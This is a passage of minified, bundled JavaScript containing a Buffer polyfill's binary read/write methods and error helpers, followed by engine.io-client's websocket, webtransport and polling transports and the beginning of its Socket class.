    this[offset] | this[offset + 1] << 8 | this[offset + 2] << 16 | this[offset + 3] << 24;
  }, $88f34ecd95880360$var$Buffer.prototype.readInt32BE = function(offset, noAssert) {
    return offset >>>= 0, noAssert || $88f34ecd95880360$var$checkOffset(offset, 4, this.length), 
    this[offset] << 24 | this[offset + 1] << 16 | this[offset + 2] << 8 | this[offset + 3];
  }, $88f34ecd95880360$var$Buffer.prototype.readBigInt64LE = $88f34ecd95880360$var$defineBigIntMethod((function(offset) {
    $88f34ecd95880360$var$validateNumber(offset >>>= 0, "offset");
    const first = this[offset], last = this[offset + 7];
    void 0 !== first && void 0 !== last || $88f34ecd95880360$var$boundsError(offset, this.length - 8);
    const val = this[offset + 4] + 256 * this[offset + 5] + 65536 * this[offset + 6] + (last << 24);
    return (BigInt(val) << BigInt(32)) + BigInt(first + 256 * this[++offset] + 65536 * this[++offset] + this[++offset] * 2 ** 24);
  })), $88f34ecd95880360$var$Buffer.prototype.readBigInt64BE = $88f34ecd95880360$var$defineBigIntMethod((function(offset) {
    $88f34ecd95880360$var$validateNumber(offset >>>= 0, "offset");
    const first = this[offset], last = this[offset + 7];
    void 0 !== first && void 0 !== last || $88f34ecd95880360$var$boundsError(offset, this.length - 8);
    const val = (first << 24) + 65536 * this[++offset] + 256 * this[++offset] + this[++offset];
    return (BigInt(val) << BigInt(32)) + BigInt(this[++offset] * 2 ** 24 + 65536 * this[++offset] + 256 * this[++offset] + last);
  })), $88f34ecd95880360$var$Buffer.prototype.readFloatLE = function(offset, noAssert) {
    return offset >>>= 0, noAssert || $88f34ecd95880360$var$checkOffset(offset, 4, this.length), 
    $4f5fe54a600adeca$export$aafa59e2e03f2942(this, offset, !0, 23, 4);
  }, $88f34ecd95880360$var$Buffer.prototype.readFloatBE = function(offset, noAssert) {
    return offset >>>= 0, noAssert || $88f34ecd95880360$var$checkOffset(offset, 4, this.length), 
    $4f5fe54a600adeca$export$aafa59e2e03f2942(this, offset, !1, 23, 4);
  }, $88f34ecd95880360$var$Buffer.prototype.readDoubleLE = function(offset, noAssert) {
    return offset >>>= 0, noAssert || $88f34ecd95880360$var$checkOffset(offset, 8, this.length), 
    $4f5fe54a600adeca$export$aafa59e2e03f2942(this, offset, !0, 52, 8);
  }, $88f34ecd95880360$var$Buffer.prototype.readDoubleBE = function(offset, noAssert) {
    return offset >>>= 0, noAssert || $88f34ecd95880360$var$checkOffset(offset, 8, this.length), 
    $4f5fe54a600adeca$export$aafa59e2e03f2942(this, offset, !1, 52, 8);
  }, $88f34ecd95880360$var$Buffer.prototype.writeUintLE = $88f34ecd95880360$var$Buffer.prototype.writeUIntLE = function(value, offset, byteLength5, noAssert) {
    if (value = +value, offset >>>= 0, byteLength5 >>>= 0, !noAssert) {
      $88f34ecd95880360$var$checkInt(this, value, offset, byteLength5, Math.pow(2, 8 * byteLength5) - 1, 0);
    }
    let mul = 1, i = 0;
    for (this[offset] = 255 & value; ++i < byteLength5 && (mul *= 256); ) this[offset + i] = value / mul & 255;
    return offset + byteLength5;
  }, $88f34ecd95880360$var$Buffer.prototype.writeUintBE = $88f34ecd95880360$var$Buffer.prototype.writeUIntBE = function(value, offset, byteLength6, noAssert) {
    if (value = +value, offset >>>= 0, byteLength6 >>>= 0, !noAssert) {
      $88f34ecd95880360$var$checkInt(this, value, offset, byteLength6, Math.pow(2, 8 * byteLength6) - 1, 0);
    }
    let i = byteLength6 - 1, mul = 1;
    for (this[offset + i] = 255 & value; --i >= 0 && (mul *= 256); ) this[offset + i] = value / mul & 255;
    return offset + byteLength6;
  }, $88f34ecd95880360$var$Buffer.prototype.writeUint8 = $88f34ecd95880360$var$Buffer.prototype.writeUInt8 = function(value, offset, noAssert) {
    return value = +value, offset >>>= 0, noAssert || $88f34ecd95880360$var$checkInt(this, value, offset, 1, 255, 0), 
    this[offset] = 255 & value, offset + 1;
  }, $88f34ecd95880360$var$Buffer.prototype.writeUint16LE = $88f34ecd95880360$var$Buffer.prototype.writeUInt16LE = function(value, offset, noAssert) {
    return value = +value, offset >>>= 0, noAssert || $88f34ecd95880360$var$checkInt(this, value, offset, 2, 65535, 0), 
    this[offset] = 255 & value, this[offset + 1] = value >>> 8, offset + 2;
  }, $88f34ecd95880360$var$Buffer.prototype.writeUint16BE = $88f34ecd95880360$var$Buffer.prototype.writeUInt16BE = function(value, offset, noAssert) {
    return value = +value, offset >>>= 0, noAssert || $88f34ecd95880360$var$checkInt(this, value, offset, 2, 65535, 0), 
    this[offset] = value >>> 8, this[offset + 1] = 255 & value, offset + 2;
  }, $88f34ecd95880360$var$Buffer.prototype.writeUint32LE = $88f34ecd95880360$var$Buffer.prototype.writeUInt32LE = function(value, offset, noAssert) {
    return value = +value, offset >>>= 0, noAssert || $88f34ecd95880360$var$checkInt(this, value, offset, 4, 4294967295, 0), 
    this[offset + 3] = value >>> 24, this[offset + 2] = value >>> 16, this[offset + 1] = value >>> 8, 
    this[offset] = 255 & value, offset + 4;
  }, $88f34ecd95880360$var$Buffer.prototype.writeUint32BE = $88f34ecd95880360$var$Buffer.prototype.writeUInt32BE = function(value, offset, noAssert) {
    return value = +value, offset >>>= 0, noAssert || $88f34ecd95880360$var$checkInt(this, value, offset, 4, 4294967295, 0), 
    this[offset] = value >>> 24, this[offset + 1] = value >>> 16, this[offset + 2] = value >>> 8, 
    this[offset + 3] = 255 & value, offset + 4;
  }, $88f34ecd95880360$var$Buffer.prototype.writeBigUInt64LE = $88f34ecd95880360$var$defineBigIntMethod((function(value, offset = 0) {
    return $88f34ecd95880360$var$wrtBigUInt64LE(this, value, offset, BigInt(0), BigInt("0xffffffffffffffff"));
  })), $88f34ecd95880360$var$Buffer.prototype.writeBigUInt64BE = $88f34ecd95880360$var$defineBigIntMethod((function(value, offset = 0) {
    return $88f34ecd95880360$var$wrtBigUInt64BE(this, value, offset, BigInt(0), BigInt("0xffffffffffffffff"));
  })), $88f34ecd95880360$var$Buffer.prototype.writeIntLE = function(value, offset, byteLength7, noAssert) {
    if (value = +value, offset >>>= 0, !noAssert) {
      const limit = Math.pow(2, 8 * byteLength7 - 1);
      $88f34ecd95880360$var$checkInt(this, value, offset, byteLength7, limit - 1, -limit);
    }
    let i = 0, mul = 1, sub = 0;
    for (this[offset] = 255 & value; ++i < byteLength7 && (mul *= 256); ) value < 0 && 0 === sub && 0 !== this[offset + i - 1] && (sub = 1), 
    this[offset + i] = (value / mul >> 0) - sub & 255;
    return offset + byteLength7;
  }, $88f34ecd95880360$var$Buffer.prototype.writeIntBE = function(value, offset, byteLength8, noAssert) {
    if (value = +value, offset >>>= 0, !noAssert) {
      const limit = Math.pow(2, 8 * byteLength8 - 1);
      $88f34ecd95880360$var$checkInt(this, value, offset, byteLength8, limit - 1, -limit);
    }
    let i = byteLength8 - 1, mul = 1, sub = 0;
    for (this[offset + i] = 255 & value; --i >= 0 && (mul *= 256); ) value < 0 && 0 === sub && 0 !== this[offset + i + 1] && (sub = 1), 
    this[offset + i] = (value / mul >> 0) - sub & 255;
    return offset + byteLength8;
  }, $88f34ecd95880360$var$Buffer.prototype.writeInt8 = function(value, offset, noAssert) {
    return value = +value, offset >>>= 0, noAssert || $88f34ecd95880360$var$checkInt(this, value, offset, 1, 127, -128), 
    value < 0 && (value = 255 + value + 1), this[offset] = 255 & value, offset + 1;
  }, $88f34ecd95880360$var$Buffer.prototype.writeInt16LE = function(value, offset, noAssert) {
    return value = +value, offset >>>= 0, noAssert || $88f34ecd95880360$var$checkInt(this, value, offset, 2, 32767, -32768), 
    this[offset] = 255 & value, this[offset + 1] = value >>> 8, offset + 2;
  }, $88f34ecd95880360$var$Buffer.prototype.writeInt16BE = function(value, offset, noAssert) {
    return value = +value, offset >>>= 0, noAssert || $88f34ecd95880360$var$checkInt(this, value, offset, 2, 32767, -32768), 
    this[offset] = value >>> 8, this[offset + 1] = 255 & value, offset + 2;
  }, $88f34ecd95880360$var$Buffer.prototype.writeInt32LE = function(value, offset, noAssert) {
    return value = +value, offset >>>= 0, noAssert || $88f34ecd95880360$var$checkInt(this, value, offset, 4, 2147483647, -2147483648), 
    this[offset] = 255 & value, this[offset + 1] = value >>> 8, this[offset + 2] = value >>> 16, 
    this[offset + 3] = value >>> 24, offset + 4;
  }, $88f34ecd95880360$var$Buffer.prototype.writeInt32BE = function(value, offset, noAssert) {
    return value = +value, offset >>>= 0, noAssert || $88f34ecd95880360$var$checkInt(this, value, offset, 4, 2147483647, -2147483648), 
    value < 0 && (value = 4294967295 + value + 1), this[offset] = value >>> 24, this[offset + 1] = value >>> 16, 
    this[offset + 2] = value >>> 8, this[offset + 3] = 255 & value, offset + 4;
  }, $88f34ecd95880360$var$Buffer.prototype.writeBigInt64LE = $88f34ecd95880360$var$defineBigIntMethod((function(value, offset = 0) {
    return $88f34ecd95880360$var$wrtBigUInt64LE(this, value, offset, -BigInt("0x8000000000000000"), BigInt("0x7fffffffffffffff"));
  })), $88f34ecd95880360$var$Buffer.prototype.writeBigInt64BE = $88f34ecd95880360$var$defineBigIntMethod((function(value, offset = 0) {
    return $88f34ecd95880360$var$wrtBigUInt64BE(this, value, offset, -BigInt("0x8000000000000000"), BigInt("0x7fffffffffffffff"));
  })), $88f34ecd95880360$var$Buffer.prototype.writeFloatLE = function(value, offset, noAssert) {
    return $88f34ecd95880360$var$writeFloat(this, value, offset, !0, noAssert);
  }, $88f34ecd95880360$var$Buffer.prototype.writeFloatBE = function(value, offset, noAssert) {
    return $88f34ecd95880360$var$writeFloat(this, value, offset, !1, noAssert);
  }, $88f34ecd95880360$var$Buffer.prototype.writeDoubleLE = function(value, offset, noAssert) {
    return $88f34ecd95880360$var$writeDouble(this, value, offset, !0, noAssert);
  }, $88f34ecd95880360$var$Buffer.prototype.writeDoubleBE = function(value, offset, noAssert) {
    return $88f34ecd95880360$var$writeDouble(this, value, offset, !1, noAssert);
  }, $88f34ecd95880360$var$Buffer.prototype.copy = function(target, targetStart, start, end) {
    if (!$88f34ecd95880360$var$Buffer.isBuffer(target)) throw new TypeError("argument should be a Buffer");
    if (start || (start = 0), end || 0 === end || (end = this.length), targetStart >= target.length && (targetStart = target.length), 
    targetStart || (targetStart = 0), end > 0 && end < start && (end = start), end === start) return 0;
    if (0 === target.length || 0 === this.length) return 0;
    if (targetStart < 0) throw new RangeError("targetStart out of bounds");
    if (start < 0 || start >= this.length) throw new RangeError("Index out of range");
    if (end < 0) throw new RangeError("sourceEnd out of bounds");
    end > this.length && (end = this.length), target.length - targetStart < end - start && (end = target.length - targetStart + start);
    const len = end - start;
    return this === target && "function" == typeof Uint8Array.prototype.copyWithin ? this.copyWithin(targetStart, start, end) : Uint8Array.prototype.set.call(target, this.subarray(start, end), targetStart), 
    len;
  }, $88f34ecd95880360$var$Buffer.prototype.fill = function(val, start, end, encoding) {
    if ("string" == typeof val) {
      if ("string" == typeof start ? (encoding = start, start = 0, end = this.length) : "string" == typeof end && (encoding = end, 
      end = this.length), void 0 !== encoding && "string" != typeof encoding) throw new TypeError("encoding must be a string");
      if ("string" == typeof encoding && !$88f34ecd95880360$var$Buffer.isEncoding(encoding)) throw new TypeError("Unknown encoding: " + encoding);
      if (1 === val.length) {
        const code = val.charCodeAt(0);
        ("utf8" === encoding && code < 128 || "latin1" === encoding) && (val = code);
      }
    } else "number" == typeof val ? val &= 255 : "boolean" == typeof val && (val = Number(val));
    if (start < 0 || this.length < start || this.length < end) throw new RangeError("Out of range index");
    if (end <= start) return this;
    let i;
    if (start >>>= 0, end = void 0 === end ? this.length : end >>> 0, val || (val = 0), 
    "number" == typeof val) for (i = start; i < end; ++i) this[i] = val; else {
      const bytes = $88f34ecd95880360$var$Buffer.isBuffer(val) ? val : $88f34ecd95880360$var$Buffer.from(val, encoding), len = bytes.length;
      if (0 === len) throw new TypeError('The value "' + val + '" is invalid for argument "value"');
      for (i = 0; i < end - start; ++i) this[i + start] = bytes[i % len];
    }
    return this;
  };
  const $88f34ecd95880360$var$errors = {};
  function $88f34ecd95880360$var$E(sym, getMessage, Base) {
    $88f34ecd95880360$var$errors[sym] = class extends Base {
      constructor() {
        super(), Object.defineProperty(this, "message", {
          value: getMessage.apply(this, arguments),
          writable: !0,
          configurable: !0
        }), this.name = `${this.name} [${sym}]`, this.stack, delete this.name;
      }
      get code() {
        return sym;
      }
      set code(value) {
        Object.defineProperty(this, "code", {
          configurable: !0,
          enumerable: !0,
          value: value,
          writable: !0
        });
      }
      toString() {
        return `${this.name} [${sym}]: ${this.message}`;
      }
    };
  }
  function $88f34ecd95880360$var$addNumericalSeparator(val) {
    let res = "", i = val.length;
    const start = "-" === val[0] ? 1 : 0;
    for (;i >= start + 4; i -= 3) res = `_${val.slice(i - 3, i)}${res}`;
    return `${val.slice(0, i)}${res}`;
  }
  function $88f34ecd95880360$var$checkIntBI(value, min, max, buf, offset, byteLength10) {
    if (value > max || value < min) {
      const n = "bigint" == typeof min ? "n" : "";
      let range;
      throw range = byteLength10 > 3 ? 0 === min || min === BigInt(0) ? `>= 0${n} and < 2${n} ** ${8 * (byteLength10 + 1)}${n}` : `>= -(2${n} ** ${8 * (byteLength10 + 1) - 1}${n}) and < 2 ** ${8 * (byteLength10 + 1) - 1}${n}` : `>= ${min}${n} and <= ${max}${n}`, 
      new $88f34ecd95880360$var$errors.ERR_OUT_OF_RANGE("value", range, value);
    }
    !function(buf, offset, byteLength9) {
      $88f34ecd95880360$var$validateNumber(offset, "offset"), void 0 !== buf[offset] && void 0 !== buf[offset + byteLength9] || $88f34ecd95880360$var$boundsError(offset, buf.length - (byteLength9 + 1));
    }(buf, offset, byteLength10);
  }
  function $88f34ecd95880360$var$validateNumber(value, name) {
    if ("number" != typeof value) throw new $88f34ecd95880360$var$errors.ERR_INVALID_ARG_TYPE(name, "number", value);
  }
  function $88f34ecd95880360$var$boundsError(value, length, type) {
    if (Math.floor(value) !== value) throw $88f34ecd95880360$var$validateNumber(value, type), 
    new $88f34ecd95880360$var$errors.ERR_OUT_OF_RANGE(type || "offset", "an integer", value);
    if (length < 0) throw new $88f34ecd95880360$var$errors.ERR_BUFFER_OUT_OF_BOUNDS;
    throw new $88f34ecd95880360$var$errors.ERR_OUT_OF_RANGE(type || "offset", `>= ${type ? 1 : 0} and <= ${length}`, value);
  }
  $88f34ecd95880360$var$E("ERR_BUFFER_OUT_OF_BOUNDS", (function(name) {
    return name ? `${name} is outside of buffer bounds` : "Attempt to access memory outside buffer bounds";
  }), RangeError), $88f34ecd95880360$var$E("ERR_INVALID_ARG_TYPE", (function(name, actual) {
    return `The "${name}" argument must be of type number. Received type ${typeof actual}`;
  }), TypeError), $88f34ecd95880360$var$E("ERR_OUT_OF_RANGE", (function(str, range, input) {
    let msg = `The value of "${str}" is out of range.`, received = input;
    return Number.isInteger(input) && Math.abs(input) > 2 ** 32 ? received = $88f34ecd95880360$var$addNumericalSeparator(String(input)) : "bigint" == typeof input && (received = String(input), 
    (input > BigInt(2) ** BigInt(32) || input < -(BigInt(2) ** BigInt(32))) && (received = $88f34ecd95880360$var$addNumericalSeparator(received)), 
    received += "n"), msg += ` It must be ${range}. Received ${received}`, msg;
  }), RangeError);
  const $88f34ecd95880360$var$INVALID_BASE64_RE = /[^+/0-9A-Za-z-_]/g;
  function $88f34ecd95880360$var$utf8ToBytes(string, units) {
    let codePoint;
    units = units || 1 / 0;
    const length = string.length;
    let leadSurrogate = null;
    const bytes = [];
    for (let i = 0; i < length; ++i) {
      if (codePoint = string.charCodeAt(i), codePoint > 55295 && codePoint < 57344) {
        if (!leadSurrogate) {
          if (codePoint > 56319) {
            (units -= 3) > -1 && bytes.push(239, 191, 189);
            continue;
          }
          if (i + 1 === length) {
            (units -= 3) > -1 && bytes.push(239, 191, 189);
            continue;
          }
          leadSurrogate = codePoint;
          continue;
        }
        if (codePoint < 56320) {
          (units -= 3) > -1 && bytes.push(239, 191, 189), leadSurrogate = codePoint;
          continue;
        }
        codePoint = 65536 + (leadSurrogate - 55296 << 10 | codePoint - 56320);
      } else leadSurrogate && (units -= 3) > -1 && bytes.push(239, 191, 189);
      if (leadSurrogate = null, codePoint < 128) {
        if ((units -= 1) < 0) break;
        bytes.push(codePoint);
      } else if (codePoint < 2048) {
        if ((units -= 2) < 0) break;
        bytes.push(codePoint >> 6 | 192, 63 & codePoint | 128);
      } else if (codePoint < 65536) {
        if ((units -= 3) < 0) break;
        bytes.push(codePoint >> 12 | 224, codePoint >> 6 & 63 | 128, 63 & codePoint | 128);
      } else {
        if (!(codePoint < 1114112)) throw new Error("Invalid code point");
        if ((units -= 4) < 0) break;
        bytes.push(codePoint >> 18 | 240, codePoint >> 12 & 63 | 128, codePoint >> 6 & 63 | 128, 63 & codePoint | 128);
      }
    }
    return bytes;
  }
  function $88f34ecd95880360$var$base64ToBytes(str) {
    return $604506cec089c996$export$d622b2ad8d90c771(function(str) {
      if ((str = (str = str.split("=")[0]).trim().replace($88f34ecd95880360$var$INVALID_BASE64_RE, "")).length < 2) return "";
      for (;str.length % 4 != 0; ) str += "=";
      return str;
    }(str));
  }
  function $88f34ecd95880360$var$blitBuffer(src, dst, offset, length) {
    let i;
    for (i = 0; i < length && !(i + offset >= dst.length || i >= src.length); ++i) dst[i + offset] = src[i];
    return i;
  }
  function $88f34ecd95880360$var$isInstance(obj, type) {
    return obj instanceof type || null != obj && null != obj.constructor && null != obj.constructor.name && obj.constructor.name === type.name;
  }
  function $88f34ecd95880360$var$numberIsNaN(obj) {
    return obj != obj;
  }
  const $88f34ecd95880360$var$hexSliceLookupTable = function() {
    const table = new Array(256);
    for (let i = 0; i < 16; ++i) {
      const i16 = 16 * i;
      for (let j = 0; j < 16; ++j) table[i16 + j] = "0123456789abcdef"[i] + "0123456789abcdef"[j];
    }
    return table;
  }();
  function $88f34ecd95880360$var$defineBigIntMethod(fn) {
    return "undefined" == typeof BigInt ? $88f34ecd95880360$var$BufferBigIntNotDefined : fn;
  }
  function $88f34ecd95880360$var$BufferBigIntNotDefined() {
    throw new Error("BigInt not supported");
  }
  const $fed3f944fa016f94$var$isReactNative = "undefined" != typeof navigator && "string" == typeof navigator.product && "reactnative" === navigator.product.toLowerCase();
  const $2fcea2ac8cdb1624$export$46dec00755c1153b = {
    websocket: class extends $46c7446dc2f9cd51$export$86495b081fef8e52 {
      constructor(opts) {
        super(opts), this.supportsBinary = !opts.forceBase64;
      }
      get name() {
        return "websocket";
      }
      doOpen() {
        if (!this.check()) return;
        const uri = this.uri(), protocols = this.opts.protocols, opts = $fed3f944fa016f94$var$isReactNative ? {} : $69315e998f85aa77$export$357523c63a2253b9(this.opts, "agent", "perMessageDeflate", "pfx", "key", "passphrase", "cert", "ca", "ciphers", "rejectUnauthorized", "localAddress", "protocolVersion", "origin", "maxPayload", "family", "checkServerIdentity");
        this.opts.extraHeaders && (opts.headers = this.opts.extraHeaders);
        try {
          this.ws = $fed3f944fa016f94$var$isReactNative ? new $7c89bb7728a1cd1b$export$3909fb301d3dc8c9(uri, protocols, opts) : protocols ? new $7c89bb7728a1cd1b$export$3909fb301d3dc8c9(uri, protocols) : new $7c89bb7728a1cd1b$export$3909fb301d3dc8c9(uri);
        } catch (err) {
          return this.emitReserved("error", err);
        }
        this.ws.binaryType = this.socket.binaryType, this.addEventListeners();
      }
      addEventListeners() {
        this.ws.onopen = () => {
          this.opts.autoUnref && this.ws._socket.unref(), this.onOpen();
        }, this.ws.onclose = closeEvent => this.onClose({
          description: "websocket connection closed",
          context: closeEvent
        }), this.ws.onmessage = ev => this.onData(ev.data), this.ws.onerror = e => this.onError("websocket error", e);
      }
      write(packets) {
        this.writable = !1;
        for (let i = 0; i < packets.length; i++) {
          const packet = packets[i], lastPacket = i === packets.length - 1;
          $500775d3b617309f$export$57852049361a8e62(packet, this.supportsBinary, (data => {
            try {
              this.ws.send(data);
            } catch (e) {}
            lastPacket && $7c89bb7728a1cd1b$export$bdd553fddd433dcb((() => {
              this.writable = !0, this.emitReserved("drain");
            }), this.setTimeoutFn);
          }));
        }
      }
      doClose() {
        void 0 !== this.ws && (this.ws.close(), this.ws = null);
      }
      uri() {
        const schema = this.opts.secure ? "wss" : "ws", query = this.query || {};
        return this.opts.timestampRequests && (query[this.opts.timestampParam] = $1afd8078cefa98bc$export$5bb64b92cb4135a()), 
        this.supportsBinary || (query.b64 = 1), this.createUri(schema, query);
      }
      check() {
        return !!$7c89bb7728a1cd1b$export$3909fb301d3dc8c9;
      }
    },
    webtransport: class extends $46c7446dc2f9cd51$export$86495b081fef8e52 {
      get name() {
        return "webtransport";
      }
      doOpen() {
        "function" == typeof WebTransport && (this.transport = new WebTransport(this.createUri("https"), this.opts.transportOptions[this.name]), 
        this.transport.closed.then((() => {
          this.onClose();
        })).catch((err => {
          this.onError("webtransport error", err);
        })), this.transport.ready.then((() => {
          this.transport.createBidirectionalStream().then((stream => {
            const decoderStream = $4f8df83d8722cdb7$export$552d20aac7500f47(Number.MAX_SAFE_INTEGER, this.socket.binaryType), reader = stream.readable.pipeThrough(decoderStream).getReader(), encoderStream = $4f8df83d8722cdb7$export$a525fb718e9c623a();
            encoderStream.readable.pipeTo(stream.writable), this.writer = encoderStream.writable.getWriter();
            const read = () => {
              reader.read().then((({done: done, value: value}) => {
                done || (this.onPacket(value), read());
              })).catch((err => {}));
            };
            read();
            const packet = {
              type: "open"
            };
            this.query.sid && (packet.data = `{"sid":"${this.query.sid}"}`), this.writer.write(packet).then((() => this.onOpen()));
          }));
        })));
      }
      write(packets) {
        this.writable = !1;
        for (let i = 0; i < packets.length; i++) {
          const packet = packets[i], lastPacket = i === packets.length - 1;
          this.writer.write(packet).then((() => {
            lastPacket && $7c89bb7728a1cd1b$export$bdd553fddd433dcb((() => {
              this.writable = !0, this.emitReserved("drain");
            }), this.setTimeoutFn);
          }));
        }
      }
      doClose() {
        var _a;
        null === (_a = this.transport) || void 0 === _a || _a.close();
      }
    },
    polling: class extends $46c7446dc2f9cd51$export$86495b081fef8e52 {
      constructor(opts) {
        if (super(opts), this.polling = !1, "undefined" != typeof location) {
          const isSSL = "https:" === location.protocol;
          let port = location.port;
          port || (port = isSSL ? "443" : "80"), this.xd = "undefined" != typeof location && opts.hostname !== location.hostname || port !== opts.port;
        }
        const forceBase64 = opts && opts.forceBase64;
        this.supportsBinary = $b139188a56fa3540$var$hasXHR2 && !forceBase64, this.opts.withCredentials && (this.cookieJar = void 0);
      }
      get name() {
        return "polling";
      }
      doOpen() {
        this.poll();
      }
      pause(onPause) {
        this.readyState = "pausing";
        const pause = () => {
          this.readyState = "paused", onPause();
        };
        if (this.polling || !this.writable) {
          let total = 0;
          this.polling && (total++, this.once("pollComplete", (function() {
            --total || pause();
          }))), this.writable || (total++, this.once("drain", (function() {
            --total || pause();
          })));
        } else pause();
      }
      poll() {
        this.polling = !0, this.doPoll(), this.emitReserved("poll");
      }
      onData(data) {
        $4f8df83d8722cdb7$export$d10cc2e7f7566a2d(data, this.socket.binaryType).forEach((packet => {
          if ("opening" === this.readyState && "open" === packet.type && this.onOpen(), "close" === packet.type) return this.onClose({
            description: "transport closed by the server"
          }), !1;
          this.onPacket(packet);
        })), "closed" !== this.readyState && (this.polling = !1, this.emitReserved("pollComplete"), 
        "open" === this.readyState && this.poll());
      }
      doClose() {
        const close = () => {
          this.write([ {
            type: "close"
          } ]);
        };
        "open" === this.readyState ? close() : this.once("open", close);
      }
      write(packets) {
        this.writable = !1, $4f8df83d8722cdb7$export$144d64fe58dad441(packets, (data => {
          this.doWrite(data, (() => {
            this.writable = !0, this.emitReserved("drain");
          }));
        }));
      }
      uri() {
        const schema = this.opts.secure ? "https" : "http", query = this.query || {};
        return !1 !== this.opts.timestampRequests && (query[this.opts.timestampParam] = $1afd8078cefa98bc$export$5bb64b92cb4135a()), 
        this.supportsBinary || query.sid || (query.b64 = 1), this.createUri(schema, query);
      }
      request(opts = {}) {
        return Object.assign(opts, {
          xd: this.xd,
          cookieJar: this.cookieJar
        }, this.opts), new $b139188a56fa3540$export$7fa6c5b6f8193917(this.uri(), opts);
      }
      doWrite(data, fn) {
        const req = this.request({
          method: "POST",
          data: data
        });
        req.on("success", fn), req.on("error", ((xhrStatus, context) => {
          this.onError("xhr post error", xhrStatus, context);
        }));
      }
      doPoll() {
        const req = this.request();
        req.on("data", this.onData.bind(this)), req.on("error", ((xhrStatus, context) => {
          this.onError("xhr poll error", xhrStatus, context);
        })), this.pollXhr = req;
      }
    }
  }, $d2a3565fdc57be10$var$re = /^(?:(?![^:@\/?#]+:[^:@\/]*@)(http|https|ws|wss):\/\/)?((?:(([^:@\/?#]*)(?::([^:@\/?#]*))?)?@)?((?:[a-f0-9]{0,4}:){2,7}[a-f0-9]{0,4}|[^:\/?#]*)(?::(\d*))?)(((\/(?:[^?#](?![^?#\/]*\.[^?#\/.]+(?:[?#]|$)))*\/?)?([^?#\/]*))(?:\?([^#]*))?(?:#(.*))?)/, $d2a3565fdc57be10$var$parts = [ "source", "protocol", "authority", "userInfo", "user", "password", "host", "port", "relative", "path", "directory", "file", "query", "anchor" ];
  function $d2a3565fdc57be10$export$98e6a39c04603d36(str) {
    const src = str, b = str.indexOf("["), e = str.indexOf("]");
    -1 != b && -1 != e && (str = str.substring(0, b) + str.substring(b, e).replace(/:/g, ";") + str.substring(e, str.length));
    let m = $d2a3565fdc57be10$var$re.exec(str || ""), uri = {}, i = 14;
    for (;i--; ) uri[$d2a3565fdc57be10$var$parts[i]] = m[i] || "";
    return -1 != b && -1 != e && (uri.source = src, uri.host = uri.host.substring(1, uri.host.length - 1).replace(/;/g, ":"), 
    uri.authority = uri.authority.replace("[", "").replace("]", "").replace(/;/g, ":"), 
    uri.ipv6uri = !0), uri.pathNames = function(obj, path) {
      const regx = /\/{2,9}/g, names = path.replace(regx, "/").split("/");
      "/" != path.slice(0, 1) && 0 !== path.length || names.splice(0, 1);
      "/" == path.slice(-1) && names.splice(names.length - 1, 1);
      return names;
    }(0, uri.path), uri.queryKey = function(uri, query) {
      const data = {};
      return query.replace(/(?:^|&)([^&=]*)=?([^&]*)/g, (function($0, $1, $2) {
        $1 && (data[$1] = $2);
      })), data;
    }(0, uri.query), uri;
  }
  class $31ec253f4133d168$export$4798917dbf149b79 extends $2f158107a3ddb7c6$export$4293555f241ae35a {
    constructor(uri, opts = {}) {
      super(), this.binaryType = "arraybuffer", this.writeBuffer = [], uri && "object" == typeof uri && (opts = uri, 
      uri = null), uri ? (uri = $d2a3565fdc57be10$export$98e6a39c04603d36(uri), opts.hostname = uri.host, 
      opts.secure = "https" === uri.protocol || "wss" === uri.protocol, opts.port = uri.port, 
      uri.query && (opts.query = uri.query)) : opts.host && (opts.hostname = $d2a3565fdc57be10$export$98e6a39c04603d36(opts.host).host), 
      $69315e998f85aa77$export$2f67576668b97183(this, opts), this.secure = null != opts.secure ? opts.secure : "undefined" != typeof location && "https:" === location.protocol, 
      opts.hostname && !opts.port && (opts.port = this.secure ? "443" : "80"), this.hostname = opts.hostname || ("undefined" != typeof location ? location.hostname : "localhost"), 
      this.port = opts.port || ("undefined" != typeof location && location.port ? location.port : this.secure ? "443" : "80"), 
      this.transports = opts.transports || [ "polling", "websocket", "webtransport" ], 
      this.writeBuffer = [], this.prevBufferLen = 0, this.opts = Object.assign({
        path: "/engine.io",
        agent: !1,
        withCredentials: !1,
        upgrade: !0,
        timestampParam: "t",
        rememberUpgrade: !1,
        addTrailingSlash: !0,
        rejectUnauthorized: !0,
        perMessageDeflate: {
          threshold: 1024
        },
        transportOptions: {},
        closeOnBeforeunload: !1
      }, opts), this.opts.path = this.opts.path.replace(/\/$/, "") + (this.opts.addTrailingSlash ? "/" : ""), 
      "string" == typeof this.opts.query && (this.opts.query = $cb5520a7cfe6b222$export$2f872c0f2117be69(this.opts.query)), 
      this.id = null, this.upgrades = null, this.pingInterval = null, this.pingTimeout = null, 
      this.pingTimeoutTimer = null, "function" == typeof addEventListener && (this.opts.closeOnBeforeunload && (this.beforeunloadEventListener = () => {
        this.transport && (this.transport.removeAllListeners(), this.transport.close());
      }, addEventListener("beforeunload", this.beforeunloadEventListener, !1)), "localhost" !== this.hostname && (this.offlineEventListener = () => {
        this.onClose("transport close", {
          description: "network connection lost"
        });
      }, addEventListener("offline", this.offlineEventListener, !1))), this.open();
    }
    createTransport(name) {
      const query = Object.assign({}, this.opts.query);
      query.EIO = 4, query.transport = name, this.id && (query.sid = this.id);
      const opts = Object.assign({}, this.opts, {
        query: query,
        socket: this,
        hostname: this.hostname,
        secure: this.secure,
        port: this.port
      }, this.opts.transportOptions[name]);
      return new $2fcea2ac8cdb1624$export$46dec00755c1153b[name](opts);
    }
    open() {
      let transport;
      if (this.opts.rememberUpgrade && $31ec253f4133d168$export$4798917dbf149b79.priorWebsocketSuccess && -1 !== this.transports.indexOf("websocket")) transport = "websocket"; else {
        if (0 === this.transports.length) return void this.setTimeoutFn((() => {
          this.emitReserved("error", "No transports available");
        }), 0);
        transport = this.transports[0];
      }
      this.readyState = "opening";
      try {
        transport = this.createTransport(transport);
      } catch (e) {
        return this.transports.shift(), void this.open();
      }
      transport.open(), this.setTransport(transport);
    }
    setTransport(transport) {
      this.transport && this.transport.removeAllListeners(), this.transport = transport, 
      transport.on("drain", this.onDrain.bind(this)).on("packet", this.onPacket.bind(this)).on("error", this.onError.bind(this)).on("close", (reason => this.onClose("transport close", reason)));
    }
    probe(name) {
      let transport = this.createTransport(name), failed = !1;
      $31ec253f4133d168$export$4798917dbf149b79.priorWebsocketSuccess = !1;
      const onTransportOpen = () => {
        failed || (transport.send([ {
          type: "ping",
          data: "probe"
        } ]), transport.once("packet", (msg => {
          if (!failed) if ("pong" === msg.type && "probe" === msg.data) {
            if (this.upgrading = !0, this.emitReserved("upgrading", transport), !transport) return;
